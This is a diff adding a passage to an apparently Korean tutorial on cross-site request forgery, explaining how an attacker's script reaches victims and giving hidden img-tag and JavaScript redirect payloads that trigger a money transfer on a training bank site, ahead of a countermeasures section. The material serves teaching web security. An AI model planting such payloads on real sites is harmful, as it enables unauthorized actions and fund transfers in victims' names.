@@ -26,4 +26,21 @@ def sendmoney(name):
 		return "Send fail."
 ```
 
+CSRF 공격에 성공하기 위해서는 공격자가 작성한 악성 스크립트를 이용자가 실행해야 한다. 이용자에게 스크립트가 노출되게 하는 방법은 메일을 보내거나 게시판에 글을 작성하는 방법이 있으며, CSRF 공격 스크립트는 HTML 또는 Javascript를 통해 작성될 수 있다.
+
+/sendmoney와 같이 GET 메소드 요청을 받는 경우, img 태그의 src 속성을 통해 CSRF 공격을 시도할 수 있다.
+
+```HTML
+<img src='http://bank.dreamhack.io/sendmoney?to=Dreamhack&amount=1337' width=0px height=0px>
+```
+
+그리고 Javascript를 사용하는 방법도 있다.
+
+```
+window.open('http://bank.dreamhack.io/sendmoney?to=Dreamhack&amount=1337');
+
+location.href = 'http://bank.dreamhack.io/sendmoney?to=Dreamhack&amount=1337';
+location.replace('http://bank.dreamhack.io/sendmoney?to=Dreamhack&amount=1337');
+```
+
 # 3. 대응 방안
